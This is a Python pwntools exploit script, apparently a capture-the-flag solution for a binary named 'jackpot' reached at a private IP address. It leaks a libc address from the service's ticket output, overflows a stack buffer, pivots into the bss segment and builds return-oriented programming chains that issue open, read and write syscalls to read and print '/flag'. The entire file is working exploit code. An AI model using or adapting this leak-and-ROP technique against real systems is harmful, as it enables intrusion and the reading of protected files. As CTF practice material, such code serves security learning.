from pwn import *
context.arch = 'amd64'

libc_offset = 0x29d90
main_base = 0x0000000000400000
read = 0x4013d4
bss = 0x0404000 + 0x600

#
#remote
#0x0000000000045eb0 : pop rax ; ret
pop_rax_offset = 0x0000000000045eb0
#0x000000000002a3e5 : pop rdi ; ret
pop_rdi_offset = 0x000000000002a3e5
#0x000000000002be51 : pop rsi ; ret
pop_rsi_offset = 0x000000000002be51
#0x00000000000904a9 : pop rdx ; pop rbx ; ret
pop_rdx_rbx_offset = 0x00000000000904a9
#   91316:	0f 05                	syscall 
#   91318:	c3                   	ret 
syscall_offset = 0x91316
#local
#syscall_offset = 0x4278e
#
#
r = remote('10.105.0.21', 12213)
#r = remote('192.168.115.69', 10101)
#r = process(['share/jackpot'])

r.recvuntil(b"Give me your number: ")
r.sendline(b'31')
r.recvuntil(b"Here is your ticket ")
libc_start_main = r.recvline().strip()
print("libc_start_main", libc_start_main)
libc_base = int(libc_start_main, 16) - libc_offset
print("libc_base", hex(libc_base))

#
pop_rax = libc_base + pop_rax_offset
pop_rdi = libc_base + pop_rdi_offset
pop_rsi = libc_base + pop_rsi_offset
pop_rdx_rbx = libc_base + pop_rdx_rbx_offset
syscall = libc_base + syscall_offset
#


r.recvuntil(b"Sign your name: ")
raw_input("debug")



#payload = b'A' * 0x100
payload = b'A' * (8 * 14)

rop = flat([bss,
            read])

payload += rop

r.send(payload.ljust(0x100, b'\x00'))
print("send payload")

r.recvuntil(b"You get nothing QQ")

payload = b'/flag'.ljust(8*14, b'\x00')

rop = flat([bss+0x200,
            pop_rax, 0x2,
            pop_rdi, 0x404590,
            pop_rsi, 0,
            pop_rdx_rbx, 0, 0,
            syscall,
            read])

payload += rop

r.send(payload.ljust(0x100, b'A'))
print("send payload")

r.recvuntil(b"You get nothing QQ")

payload = b'A' * (8 * 14)

rop = flat([bss,
            pop_rax, 0x0,
            pop_rdi, 3,
            pop_rsi, bss - 0x200,
            pop_rdx_rbx, 0x100, 0,
            syscall,
            read])

payload += rop

r.send(payload.ljust(0x100, b'A'))
print("send payload")

r.recvuntil(b"You get nothing QQ")

payload = b'A' * (8 * 14)

rop = flat([bss+0x200,
            pop_rax, 0x1,
            pop_rdi, 1,
            pop_rsi, bss - 0x200,
            pop_rdx_rbx, 0x100, 0,
            syscall,
            ])

payload += rop

r.send(payload.ljust(0x100, b'A'))
print("send payload")


r.interactive()
exit()



#0x0000000000142f38 : mov edx, 0xffffffff ; ret